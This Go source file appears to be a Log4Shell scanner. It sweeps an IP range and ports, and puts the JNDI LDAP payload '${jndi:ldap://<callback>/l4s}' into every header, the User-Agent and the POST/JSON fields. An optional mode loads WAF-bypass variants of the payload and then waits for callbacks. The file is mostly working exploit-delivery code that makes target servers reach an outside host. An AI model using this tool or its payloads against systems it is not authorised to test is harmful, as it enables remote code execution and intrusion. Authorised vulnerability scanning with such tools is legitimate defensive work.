package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	windowsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	darwinUserAgent  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
)

var (
	DefaultUserAgent string
)

func request(ctx context.Context, cfg *config) error {
	log.Printf("[i] Start scanning CIDR %s\n---------", cfg.cidr)

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	transport.Proxy = http.ProxyFromEnvironment
	if cfg.proxy != "" {
		proxyURL, err := url.Parse(cfg.proxy)
		if err != nil {
			return err
		}

		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Timeout:   time.Millisecond * 75,
		Transport: transport,
	}

	ports := strings.Split(cfg.ports, ",")

	_, ipv4Net, err := net.ParseCIDR(cfg.cidr)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	for i := start; i <= finish; i++ {
		payloads, err := createPayloads(cfg)
		if err != nil {
			return err
		}

		for _, p := range payloads {
			header, err := createHTTPHeader(cfg, p)
			if err != nil {
				return err
			}

			ip := make(net.IP, 4)
			binary.BigEndian.PutUint32(ip, i)

			for _, p := range ports {
				u := fmt.Sprintf("%s://%s:%s", cfg.schema, ip, p)

				log.Printf("[i] Checking %s\n", u)

				var req *http.Request
				switch cfg.requestType {
				case "get":
					req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
					if err != nil {
						return err
					}
				case "post":
					fields, err := readFields()
					if err != nil {
						return err
					}

					data := url.Values{}
					for _, field := range fields {
						data.Set(field, p)
					}

					req, err = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(data.Encode()))
					if err != nil {
						return err
					}
				case "json":
					fields, err := readFields()
					if err != nil {
						return err
					}

					values := make(map[string]string)
					for _, field := range fields {
						values[field] = p
					}

					jsonValue, err := json.Marshal(values)
					if err != nil {
						return err
					}

					req, err = http.NewRequestWithContext(ctx, "POST", u, bytes.NewBuffer(jsonValue))
					if err != nil {
						return err
					}
				}

				req.Header = *header

				response, err := client.Do(req)
				if err != nil {
					// ignore
					continue
				}
				defer response.Body.Close()

			}
		}
	}

	log.Printf("[i] Completed scanning of CIDR %s\n", cfg.cidr)
	if cfg.listen {
		log.Println("[i] Waiting for incoming callbacks!")
		log.Println("[i] Use ctrl+c to stop the program.")
	}

	return nil
}

func createHTTPHeader(cfg *config, payload string) (*http.Header, error) {
	data, err := f.ReadFile("resource/header.txt")
	if err != nil {
		return nil, err
	}

	keys := strings.Split(string(data), "\n")

	header := &http.Header{}

	header.Set("User-Agent", DefaultUserAgent)

	for _, h := range keys {
		if h == "User-Agent" && !cfg.noUserAgentFuzzing {
			header.Set("User-Agent", payload)
			continue
		}

		if h == "Referer" {
			header.Set("Referer", fmt.Sprintf("https://%s", payload))
		}

		header.Add(h, payload)
	}

	return header, nil
}

func createPayloads(cfg *config) ([]string, error) {
	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", cfg.caddr)}

	if cfg.wafBypass {
		t, err := template.ParseFS(f, "resource/bypass.txt")
		if err != nil {
			return nil, err
		}

		var buf bytes.Buffer
		if err := t.Execute(&buf, map[string]string{
			"CADDR":    cfg.caddr,
			"Resource": "l4s",
		}); err != nil {
			return nil, err
		}

		payloads = append(payloads, strings.Split(buf.String(), "\n")...)
	}

	return payloads, nil
}

func readFields() ([]string, error) {
	data, err := f.ReadFile("resource/fields.txt")
	if err != nil {
		return nil, err
	}

	return strings.Split(string(data), "\n"), nil
}

func init() {
	switch runtime.GOOS {
	case "windows":
		DefaultUserAgent = windowsUserAgent
	case "darwin":
		DefaultUserAgent = darwinUserAgent
	default:
		DefaultUserAgent = defaultUserAgent
	}
}
